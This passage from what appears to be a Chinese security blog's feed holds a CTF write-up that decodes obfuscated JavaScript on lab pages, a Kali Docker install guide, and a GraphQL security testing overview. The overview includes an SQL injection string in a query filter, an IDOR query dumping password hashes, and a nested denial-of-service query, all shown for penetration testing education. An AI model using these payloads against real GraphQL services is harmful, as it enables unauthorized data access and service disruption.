])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()`</code></pre><p>控制台解码提示<code>Hint:urlenode</code><br>再仔细查看源码发现</p><pre><code>var Words =&quot;%3Ccenter%3E%0A%0A%3Cp%3E%u4E0D%u96BE%u7684%uFF0C%u8F93%u5165%u5BC6%u7801%u8FA3%21%3C%2fp%3E%0A%0A%3Cscript%20language%3D%22JScript.Encode%22%3E%23@%7E%5EEwAAAA%3D%3DC%5E%2b.D%60rt%2b%5EVKE%23p@%23@%26EwUAAA%3D%3D%5E%23%7E@%0A%0A%3C%21--%0A%09%2f%2f%2a%2a%2a%28%u3065%uFFE3%203%uFFE3%29%u3065%u6211%u8981%u62B1%u62B1%21%21%21%2a%2a%2a%0Aeval%28function%28p%2Ca%2Cc%2Ck%2Ce%2Cd%29%7Be%3Dfunction%28c%29%7Breturn%28c%3Ca%3F%22%22%3Ae%28parseInt%28c%2fa%29%29%29%2b%28%28c%3Dc%25a%29%3E35%3FString.fromCharCode%28c%2b29%29%3Ac.toString%2836%29%29%7D%3Bif%28%21%27%27.replace%28%2f%5E%2f%2CString%29%29%7Bwhile%28c--%29d%5Be%28c%29%5D%3Dk%5Bc%5D%7C%7Ce%28c%29%3Bk%3D%5Bfunction%28e%29%7Breturn%20d%5Be%5D%7D%5D%3Be%3Dfunction%28%29%7Breturn%27%5C%5Cw%2b%27%7D%3Bc%3D1%3B%7D%3Bwhile%28c--%29if%28k%5Bc%5D%29p%3Dp.replace%28new%20RegExp%28%27%5C%5Cb%27%2be%28c%29%2b%27%5C%5Cb%27%2C%27g%27%29%2Ck%5Bc%5D%29%3Breturn%20p%3B%7D%28%27%3C%21--v%20p%28%29%7B6%208%3Dh.o.e.n%3B6%202%3D%22q%3D%3D%22%3B6%20a%3D%5C%27t.s%3Fe%3D%5C%27%3B6%20d%3Dj.r%3B6%20k%3D%5C%27%5C%27%3B6%20g%3D2.9%28m%2C4%2a4%29%2b2.9%28l%2C5%2a5%29%2b2.9%280%2C1%29%2b2.b%287%2C1%29%2b2.b%28z%2C1%29%2b2.b%28B%2C1%29%2b2.9%283%2b3%2C7%29%3B8%3Dd.b%28d.f%28%5C%27%3F%5C%27%29%2b1%29%3Ba%3Da.9%280%2Ca.f%28%5C%27%3F%5C%27%29%2b1%29%2b%5C%27A%3D%5C%27%3Bw%28i%3D0%3Bi%3C8.y%3Bi%2b%2b%29%7Bx%288.c%28i%29%3D%3Dg.c%28i%29%29%7Bh.u%288.c%28i%29%29%7D%7Dj%3Da%2b8%7D--%3E%27%2C38%2C38%2C%27%7C%7Ccry%7C%7C%7C%7Cvar%7C%7Cpass%7Csubstring%7Caddr%7Csubstr%7CcharAt%7Clocatie%7Cpasswd%7CindexOf%7Cpass2%7Cdocument%7C%7Clocation%7Cout%7C24%7C15%7Cvalue%7Cform%7Czhegejiamiyidiandoubuku%7CRm9yM0re354v5E4FUg5FasDboooo%7Chref%7Cphp%7Csoroki%7Cwrite%7Cfunction%7Cfor%7Cif%7CLen%7C11%7Cl0vau%7C13%27.split%28%27%7C%27%29%2C0%2C%7B%7D%29%29%0A--%3E%0A%3C%2fscript%3E%0A%0A%3Cform%20name%3D%22form%22%3E%0APassword%3A%20%3Cinput%20type%3D%22password%22%20name%3D%22passwd%22%3E%20%3Cinput%20type%3D%22button%22%20value%3D%22boom%21%21%21%21%22%20onClick%3D%22zhegejiamiyidiandoubuku%28%29%22%3E%0A%3C%2fform%3E%0A%0A%3C%2fcenter%3E&quot;;</code></pre><p>urldecode得到<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>不难的，输入密码辣!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"JScript.Encode"</span>&gt;</span><span class="undefined">#@~^EwAAAA==C^+.D`rt+^VKE#p@#@&amp;EwUAAA==^#~@</span></span><br><span class="line"><span class="undefined">&lt;!--</span></span><br><span class="line"><span class="undefined">    //***(づ￣ 3￣)づ我要抱抱!!!***</span></span><br><span class="line"><span class="xml">eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c<span class="tag">&lt;<span class="name">a?"":e(parseInt(c</span>/<span class="attr">a</span>)))+((<span class="attr">c</span>=<span class="string">c%a)</span>&gt;</span>35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!''.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return'\\w+'&#125;;c=1;&#125;;while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;&#125;('<span class="comment">&lt;!--v p()&#123;6 8=h.o.e.n;6 2="q==";6 a=\'t.s?e=\';6 d=j.r;6 k=\'\';6 g=2.9(m,4*4)+2.9(l,5*5)+2.9(0,1)+2.b(7,1)+2.b(z,1)+2.b(B,1)+2.9(3+3,7);8=d.b(d.f(\'?\')+1);a=a.9(0,a.f(\'?\')+1)+\'A=\';w(i=0;i&lt;8.y;i++)&#123;x(8.c(i)==g.c(i))&#123;h.u(8.c(i))&#125;&#125;j=a+8&#125;--&gt;</span>',38,38,'||cry||||var||pass|substring|addr|substr|charAt|locatie|passwd|indexOf|pass2|document||location|out|24|15|value|form|zhegejiamiyidiandoubuku|Rm9yM0re354v5E4FUg5FasDboooo|href|php|soroki|write|function|for|if|Len|11|l0vau|13'.split('|'),0,&#123;&#125;))</span></span><br><span class="line"><span class="undefined">--&gt;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"form"</span>&gt;</span></span><br><span class="line">Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"passwd"</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"boom!!!!"</span> <span class="attr">onClick</span>=<span class="string">"zhegejiamiyidiandoubuku()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>经过网站解密:<a href="https://www.sojson.com/jsjiemi.html" target="_blank" rel="noopener">https://www.sojson.com/jsjiemi.html</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--<span class="function"><span class="keyword">function</span> <span class="title">zhegejiamiyidiandoubuku</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pass=<span class="built_in">document</span>.form.passwd.value;</span><br><span class="line">    <span class="keyword">var</span> cry=<span class="string">"Rm9yM0re354v5E4FUg5FasDboooo=="</span>;</span><br><span class="line">    <span class="keyword">var</span> addr=<span class="string">'soroki.php?passwd='</span>;</span><br><span class="line">    <span class="keyword">var</span> locatie=location.href;</span><br><span class="line">    <span class="keyword">var</span> out=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> pass2=cry.substring(<span class="number">15</span>,<span class="number">4</span>*<span class="number">4</span>)+cry.substring(<span class="number">24</span>,<span class="number">5</span>*<span class="number">5</span>)+cry.substring(<span class="number">0</span>,<span class="number">1</span>)+cry.substr(<span class="number">7</span>,<span class="number">1</span>)+cry.substr(<span class="number">11</span>,<span class="number">1</span>)+cry.substr(<span class="number">13</span>,<span class="number">1</span>)+cry.substring(<span class="number">3</span>+<span class="number">3</span>,<span class="number">7</span>);</span><br><span class="line">    pass=locatie.substr(locatie.indexOf(<span class="string">'?'</span>)+<span class="number">1</span>);addr=addr.substring(<span class="number">0</span>,addr.indexOf(<span class="string">'?'</span>)+<span class="number">1</span>)+<span class="string">'l0vau='</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;pass.Len;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pass.charAt(i)==pass2.charAt(i))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">document</span>.write(pass.charAt(i))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;location=addr+pass</span><br><span class="line">    &#125;--&gt;</span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string">将以下代码放置控制台运行</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>javascript</span><br><span class="line">     <span class="keyword">var</span> cry=<span class="string">"Rm9yM0re354v5E4FUg5FasDboooo=="</span>;</span><br><span class="line">        <span class="keyword">var</span> addr=<span class="string">'soroki.php?passwd='</span>;</span><br><span class="line">        <span class="keyword">var</span> locatie=location.href;</span><br><span class="line">        <span class="keyword">var</span> out=<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">var</span> pass2=cry.substring(<span class="number">15</span>,<span class="number">4</span>*<span class="number">4</span>)+cry.substring(<span class="number">24</span>,<span class="number">5</span>*<span class="number">5</span>)+cry.substring(<span class="number">0</span>,<span class="number">1</span>)+cry.substr(<span class="number">7</span>,<span class="number">1</span>)+cry.substr(<span class="number">11</span>,<span class="number">1</span>)+cry.substr(<span class="number">13</span>,<span class="number">1</span>)+cry.substring(<span class="number">3</span>+<span class="number">3</span>,<span class="number">7</span>);</span><br><span class="line">        pass=locatie.substr(locatie.indexOf(<span class="string">'?'</span>)+<span class="number">1</span>);addr=addr.substring(<span class="number">0</span>,addr.indexOf(<span class="string">'?'</span>)+<span class="number">1</span>)+<span class="string">'l0vau='</span>;</span><br><span class="line">    <span class="string">"soroki.php?l0vau="</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/05/30/5b0eb0f922d41.png" alt=""></p><p>得到<code>soroki.php?l0vau=</code></p><p>编写python代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">cry=<span class="string">"Rm9yM0re354v5E4FUg5FasDboooo=="</span></span><br><span class="line">addr=<span class="string">'soroki.php?passwd='</span></span><br><span class="line">locatie=<span class="string">"http://ctf5.shiyanbar.com/crypto/4/"</span></span><br><span class="line">pass2=cry[<span class="number">15</span>:<span class="number">16</span>]+cry[<span class="number">24</span>:<span class="number">25</span>]+cry[<span class="number">0</span>:<span class="number">1</span>]+cry[<span class="number">7</span>:<span class="number">8</span>]+cry[<span class="number">11</span>:<span class="number">12</span>]+cry[<span class="number">13</span>:<span class="number">14</span>]+cry[<span class="number">6</span>:<span class="number">7</span>]</span><br><span class="line">addr=addr[:addr.index(<span class="string">'?'</span>)+<span class="number">1</span>]+<span class="string">'l0vau='</span></span><br><span class="line">location=locatie+addr+pass2</span><br><span class="line"><span class="keyword">print</span> location</span><br><span class="line">html=requests.get(location)</span><br></pre></td></tr></table></figure></p><p>得到<code>http://ctf5.shiyanbar.com/crypto/4/soroki.php?l0vau=FoRevEr</code><br>得到<code>aW4yIHNheTpJIGxvdmUgeW91IEZvcmV2ZXIhVGhlIEdpcmwgc2F5OiB6cWN7ZmtxdGxfZnBfeWZkX3B5fQ==</code><br>解密<code>in2 say:I love you Forever!The Girl say: zqc{fkqtl_fp_yfd_py}</code><br>flag:ctf{intwo_is_big_sb}</p><h3 id="js"><a href="#js" class="headerlink" title="js"></a>js</h3><p>小明某天在看js的时候，突然看到了这么一段代码，发现怎么也理不出代码逻辑，你能帮帮他吗？<br>格式：SimCTF{}<br>解题链接： <a href="http://ctf5.shiyanbar.com/crypto/2.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/crypto/2.html</a></p><p>一定要在查看源码中复制代码,把下面eval转换为console.log再放到控制台中运行<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)</span>&#123;e=<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">""</span>:e(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="built_in">String</span>.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)d[e(c)]=k[c]||e(c);k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>;&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c]);<span class="keyword">return</span> p;&#125;(<span class="string">'&lt;1 8="7/a"&gt;9(\'\\6\\3\\2\\5\\4\\b\\i\\h\\k\\j\\0\\g\\d\\c\\f\\0\\e\')&lt;/1&gt;'</span>,<span class="number">21</span>,<span class="number">21</span>,<span class="string">'u0065|script|u006d|u0069|u0054|u0043|u0053|text|type|alert|javascript|u0046|u006f|u0063|u007d|u0064|u006e|u006a|u007b|u005f|u0073'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;))</span><br><span class="line"></span><br><span class="line">得到</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;alert(<span class="string">'\u0053\u0069\u006d\u0043\u0054\u0046\u007b\u006a\u0073\u005f\u0065\u006e\u0063\u006f\u0064\u0065\u007d'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>解密：<a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/tools/unicode.aspx</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;密码学&quot;&gt;&lt;a href=&quot;#密码学&quot; class=&quot;headerlink&quot; title=&quot;密码学&quot;&gt;&lt;/a&gt;密码学&lt;/h2&gt;&lt;h3 id=&quot;疑惑的汉字&quot;&gt;&lt;a href=&quot;#疑惑的汉字&quot; class=&quot;headerlink&quot; title=&quot;疑惑的汉字&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
      <category term="writeup ctf" scheme="https://threst.github.io/tags/writeup-ctf/"/>
    
  </entry>
  
  <entry>
    <title>kali下安装docker</title>
    <link href="https://threst.github.io/2018/05/29/kali%E5%AE%89%E8%A3%85docker/"/>
    <id>https://threst.github.io/2018/05/29/kali安装docker/</id>
    <published>2018-05-29T12:33:09.000Z</published>
    <updated>2018-05-30T14:35:17.620Z</updated>
    
    <content type="html"><![CDATA[<p>周末水了下suctf，只做出签到题，太菜了，今天在安全客上面梅子酒师傅发出了wp，看了之后觉得质量非常高，最重要的是可以在docker上复现，发现现在kali上面并没有安装docker，之前在知乎上面写过一篇关于如何安装docker的<a href="https://zhuanlan.zhihu.com/p/32288292" target="_blank" rel="noopener">文章</a>，于是晚上试了下，尴尬的是失败了！！google了下，喜获一个一键安装脚本，看了下大佬脚本发现可能是<code>apt-get install docker-ce</code>这个的问题，因为之前一直是<code>apt-cache policy docker-engine</code></p><h2 id="之前的安装方式"><a href="#之前的安装方式" class="headerlink" title="之前的安装方式"></a>之前的安装方式</h2><p>由于kali linux是基于Debian Wheezy，所以这里docker需要的内核版本至少是3.10，因此需要检查下kali的内核，如果不够的话，需要更新内核<br><code>uname -a</code><br>切换用户root下</p><h3 id="1-创建-etc-apt-sources-list-d-backports-list"><a href="#1-创建-etc-apt-sources-list-d-backports-list" class="headerlink" title="1.创建/etc/apt/sources.list.d/backports.list"></a>1.创建/etc/apt/sources.list.d/backports.list</h3><p><code>leafpad /etc/apt/sources.list.d/backports.list</code></p><h3 id="2-在list文件里加上一条反向端口条目"><a href="#2-在list文件里加上一条反向端口条目" class="headerlink" title="2.在list文件里加上一条反向端口条目"></a>2.在list文件里加上一条反向端口条目</h3><p><code>deb http://http.debian.net/debian wheezy-backports main</code></p><h3 id="3-更新软件包"><a href="#3-更新软件包" class="headerlink" title="3.更新软件包"></a>3.更新软件包</h3><p><code>apt update</code></p><h3 id="4-如果以前安装过docker"><a href="#4-如果以前安装过docker" class="headerlink" title="4.如果以前安装过docker"></a>4.如果以前安装过docker</h3><p>就这样删除所有旧版本docker</p><pre><code>apt-get purge lxc-docker*apt-get purge docker.io*</code></pre><p>可能没有旧版本（之前没有安装过）<br>没有的继续</p><h3 id="5-确认apt添加了https方法和CA-cerificates"><a href="#5-确认apt添加了https方法和CA-cerificates" class="headerlink" title="5.确认apt添加了https方法和CA cerificates"></a>5.确认apt添加了https方法和CA cerificates</h3><p><code>apt-get install apt-transport-https ca-certificates gnupg2</code></p><h3 id="6-添加一个新的GPG-key"><a href="#6-添加一个新的GPG-key" class="headerlink" title="6.添加一个新的GPG key"></a>6.添加一个新的GPG key</h3><p><code>apt-key adv --keyserver hkp://ha.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D</code></p><h3 id="7-安装repository"><a href="#7-安装repository" class="headerlink" title="7.安装repository"></a>7.安装repository</h3><p><code>apt-cache policy docker-engine</code><br>这个命令可以查看是否存在资源之后再<br><code>apt-get install docker-engine</code><br>但是这个好像不行了要执行下列命令<br><code>apt-get install docker-ce</code></p><h2 id="一键安装脚本"><a href="#一键安装脚本" class="headerlink" title="一键安装脚本"></a>一键安装脚本</h2><pre><code>#!/bin/bash# install dependencies sudo apt-get install apt-transport-https ca-certificates curl gnupg software-properties-common dirmngr# use https get sources  sudo echo &quot;deb https://http.kali.org/kali kali-rolling main non-free contrib&quot; &gt; /etc/apt/sources.listsudo echo &quot;deb-src https://http.kali.org/kali kali-rolling main non-free contrib&quot; &gt;&gt; /etc/apt/sources.list# update apt-getexport DEBIAN_FRONTEND=&quot;noninteractive&quot;sudo apt-get update# remove previously installed Dockersudo apt-get purge lxc-docker*sudo apt-get purge docker.io*# add Docker repo gpg keycurl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -# add deb docker sourcessudo echo &quot;deb [arch=amd64] https://download.docker.com/linux/debian stretch stable&quot; &gt;&gt; /etc/apt/sources.list cat &gt; /etc/apt/sources.list.d/docker.list &lt;&lt;&apos;EOF&apos;deb https://apt.dockerproject.org/repo debian-stretch mainEOFsudo apt-get update# install Dockersudo apt-get install docker-ce# run Hellow World imagesudo docker run hello-world# manage Docker as a non-root usersudo groupadd dockersudo usermod -aG docker $USER# configure Docker to start on bootsudo systemctl enable docker</code></pre><p><a href="https://github.com/Mr-xn/Kali-install-docker" target="_blank" rel="noopener">脚本地址</a></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试:"></a>测试:</h2><p><code>root@kali:/home/threst# docker run hello-world</code><br>出现下面这个就是安装成功了</p><pre><code>Hello from Docker!This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.    (amd64) 3. The Docker daemon created a new container from that image which runs the    executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it    to your terminal.To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bashShare images, automate workflows, and more with a free Docker ID: https://hub.docker.com/For more examples and ideas, visit: https://docs.docker.com/engine/userguide/</code></pre><p>使用国内镜像:<br><code>docker pull registry.docker-cn.com/myname/myrepo:mytag</code><br>例如<br><code>docker pull registry.docker-cn.com/suctf/2018-web-annonymous</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;周末水了下suctf，只做出签到题，太菜了，今天在安全客上面梅子酒师傅发出了wp，看了之后觉得质量非常高，最重要的是可以在docker上复现，发现现在kali上面并没有安装docker，之前在知乎上面写过一篇关于如何安装docker的&lt;a href=&quot;https://zhu
      
    
    </summary>
    
    
      <category term="kali docker" scheme="https://threst.github.io/tags/kali-docker/"/>
    
  </entry>
  
  <entry>
    <title>你肯定不知道的GraphQL安全概述和测试技巧</title>
    <link href="https://threst.github.io/2018/05/22/%E4%BD%A0%E8%82%AF%E5%AE%9A%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84GraphQL%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0%E5%92%8C%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/"/>
    <id>https://threst.github.io/2018/05/22/你肯定不知道的GraphQL安全概述和测试技巧/</id>
    <published>2018-05-22T09:33:09.000Z</published>
    <updated>2018-05-22T14:32:49.122Z</updated>
    
    <content type="html"><![CDATA[<h2 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h2><p>随着GraphQL技术的日益普及，我们总结了一些关于常见安全错误的文档和提示。</p><h2 id="什么是GraphQL？"><a href="#什么是GraphQL？" class="headerlink" title="什么是GraphQL？"></a>什么是GraphQL？</h2><p><a href="https://graphql.org/" target="_blank" rel="noopener">GraphQL</a>是由Facebook开发并于2015年公开发布的数据查询语言。它是REST API的替代品。</p><p>即使你没有看到任何GraphQL在那里，很可能你已经在使用它，因为它是在一些大的科技巨头，Facebook, GitHub, Pinterest, Twitter, HackerOne<a href="http://graphql.org/users/" target="_blank" rel="noopener">更多</a>。</p><h3 id="这项技术的几个关键点"><a href="#这项技术的几个关键点" class="headerlink" title="这项技术的几个关键点"></a>这项技术的几个关键点</h3><p>1.GraphQL提供了API中数据的完整和可理解的描述，并使客户能够精确地询问他们需要什么。返回可预测的结果。<br>2.典型的RESTAPI需要从多个URL进行加载，但GraphQLAPI可以在单个请求中获取应用程序所需的所有数据。<br>3.GraphQL api是按照类型和字段而不是端点来组织的,您可以从单个端点访问所有数据的全部功能。<br>4.GraphQL是强类型的，以确保应用程序只询问可能的情况并提供明确而有用的错误。<br>5.新的字段和类型可以添加到GraphQL API，而不会影响现有的查询。老化的字段可以被弃用，并且隐藏在工具中。</p><p>在开始深入研究GraphQL安全领域之前，下面简要回顾它的工作原理。该<a href="http://graphql.org/learn/" target="_blank" rel="noopener">官方文档</a>写得很好，是真正有用的。</p><p>一个GraphQL查询如下所示：<br>基本的GraphQL查询</p><pre><code>query{    user{        id        email        firstName        lastName    }}</code></pre><p>尽管响应是JSON：<br>基本的GraphQL响应</p><pre><code>{    &quot;data&quot;: {        &quot;user&quot;: {            &quot;id&quot;: &quot;1&quot;,            &quot;email&quot;: &quot;paolo@doyensec.com&quot;,            &quot;firstName&quot;: &quot;Paolo&quot;,            &quot;lastName&quot;: &quot;Stagno&quot;        }    }}</code></pre><h2 id="安全测试技巧"><a href="#安全测试技巧" class="headerlink" title="安全测试技巧"></a>安全测试技巧</h2><p>由于Burp Suite不太了解GraphQL语法，因此我建议使用graphql-ide，这是一个基于Electron的应用程序，允许您编辑和发送请求至GraphQL端点; 我还编写了一个小python脚本GraphQL_Introspection.py，它列举了一个GraphQL端点（带有内省），以便提取文档。该脚本对于检查GraphQL模式寻找信息泄露，隐藏数据和不可访问的字段非常有用。</p><p>该工具将生成类似于以下内容的HTML报告：<br><img src="https://p5.ssl.qhimg.com/t010f25d4f4ec02bcc3.png" alt=""></p><p>内省是用来要求一个GraphQL模式来获取关于它所支持的查询、类型等信息的信息。</p><p>作为一个渗透测试人员，我建议你去寻找发给<code>“/ graphql”</code>或<code>“/graphql.php”</code>的请求，因为这些是通常的GraphQL端点名称; 您还应搜索<code>“/ graphiql”</code>，<code>“graphql / console /”</code>，联机GraphQL IDE与后端交互，以及<code>“/graphql.php?debug=1”</code>（带有附加错误报告的调试模式），因为它们可能会被留下由开发人员开放。</p><p>在测试应用程序时，验证是否可以在没有通常授权令牌标头的情况下发出请求：<br><img src="https://p4.ssl.qhimg.com/t01cdb0b72a8ef0cb76.png" alt=""></p><p>由于GraphQL框架没有提供任何保护数据的手段，因此开发人员因按照文档中的说明实施访问控制：</p><blockquote><p>“但是，对于生产代码库，将授权逻辑委托给业务逻辑层”。</p></blockquote><p>任何事情都可能会出错，因此没有正确认证和或授权的用户是否可以从服务器请求整个底层数据库非常重要。<br>当使用GraphQL构建应用程序时，开发人员必须将数据映射到他们选择的数据库技术中的查询。这是易于引入安全漏洞的原因，导致 破坏访问控制，不安全的直接对象引用甚至SQL / NoSQL注入。</p><p>作为破坏实现的一个示例，以下请求 / 响应表明我们可以为平台的任何用户（通过ID参数循环访存）获取数据，同时转储密码哈希值：</p><p>询问</p><pre><code>query{    user(id: 165274){        id        email        firstName        lastName        password    }}</code></pre><p>响应</p><pre><code>{    &quot;data&quot;: {        &quot;user&quot;: {            &quot;id&quot;: &quot;165274&quot;,            &quot;email&quot;: &quot;johndoe@mail.com&quot;,            &quot;firstName&quot;: &quot;John&quot;,            &quot;lastName&quot;: &quot;Doe&quot;            &quot;password&quot;: &quot;5F4DCC3B5AA765D61D8327DEB882CF99&quot;        }    }}</code></pre><p>您需要检查的另一件事与尝试执行非法查询时的信息泄露有关：<br>信息披露</p><pre><code>{    &quot;errors&quot;: [        {            &quot;message&quot;: &quot;Invalid ID.&quot;,            &quot;locations&quot;: [                {                    &quot;line&quot;: 2,                    &quot;column&quot;: 12                }                &quot;Stack&quot;: &quot;Error: invalid ID\n at (/var/www/examples/04-bank/graphql.php)\n&quot;                ]        }    ]}</code></pre><p>虽然GraphQL是强类型的，但SQL / NoSQL注入仍然是可能的，因为GraphQL只是客户端应用程序和数据库之间的一个层。问题可能存在于为了查询数据库而从GraphQL查询中获取变量的层中，未正确清理的变量导致旧的简单SQL注入。在Mongodb的情况下，NoSQL注入可能并不那么简单，因为我们不能”juggle”类型（例如将字符串转换为数组，请参阅PHP MongoDB注入）。</p><p>GraphQL SQL注入</p><pre><code>mutation search($filters Filters!){    authors(filter: $filters)    viewer{        id        email        firstName        lastName    } }{    &quot;filters&quot;:{        &quot;username&quot;:&quot;paolo&apos; or 1=1--&quot;        &quot;minstories&quot;:0    }}</code></pre><p>谨防嵌套查询！它们可以允许恶意客户端通过过度复杂的查询来执行DoS（拒绝服务）攻击，这些查询会占用服务器的所有资源：</p><p>嵌套查询</p><pre><code>query { stories{  title  body  comments{   comment   author{    comments{     author{      comments{       comment       author{        comments{         comment         author{          comments{           comment           author{            name           }          }         }        }       }      }     }    }   }  } }}</code></pre><p>可能设置超时，最大深度或查询复杂度阈值来针对DoS进行简单补救<br>请记住，在PHP GraphQL实现中：<br>复杂性分析默认是禁用的<br>限制查询深度默认情况下处于禁用状态<br>自省是默认启用的。这意味着任何人都可以通过发送包含元字段类型和模式的特殊查询来完整描述您的模式</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>GraphQL是一项新的有趣的技术，可用于构建安全的应用程序。由于开发人员负责实施访问控制，因此应用程序很容易出现经典的Web应用程序漏洞，如Broken Access Controls，不安全的直接对象引用，跨站点脚本（XSS）和经典注入漏洞。就像任何技术一样，基于GraphQL的应用程序可能会像这个实际例子那样容易出现开发实现错误：</p><blockquote><p>“通过使用脚本，整个国家（我用美国，英国和加拿大测试过的）可能的号码组合都可以通过这些URL运行，并且如果一个号码与Facebook帐户相关联，则它可以与名称和更多细节（图像等）。“</p></blockquote><p>参考:<br><a href="https://en.wikipedia.org/wiki/GraphQL" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/GraphQL</a><br><a href="https://dev-blog.apollodata.com/the-concepts-of-graphql-bc68bd819be3" target="_blank" rel="noopener">https://dev-blog.apollodata.com/the-concepts-of-graphql-bc68bd819be3</a><br><a href="https://graphql.org/learn/" target="_blank" rel="noopener">https://graphql.org/learn/</a><br><a href="https://www.howtographql.com/" target="_blank" rel="noopener">https://www.howtographql.com/</a><br><a href="https://www.hackerone.com/blog/the-30-thousand-dollar-gem-part-1" target="_blank" rel="noopener">https://www.hackerone.com/blog/the-30-thousand-dollar-gem-part-1</a><br><a href="https://hackerone.com/reports/291531" target="_blank" rel="noopener">https://hackerone.com/reports/291531</a><br><a href="https://labs.detectify.com/2018/03/14/graphql-abuse/" target="_blank" rel="noopener">https://labs.detectify.com/2018/03/14/graphql-abuse/</a><br><a 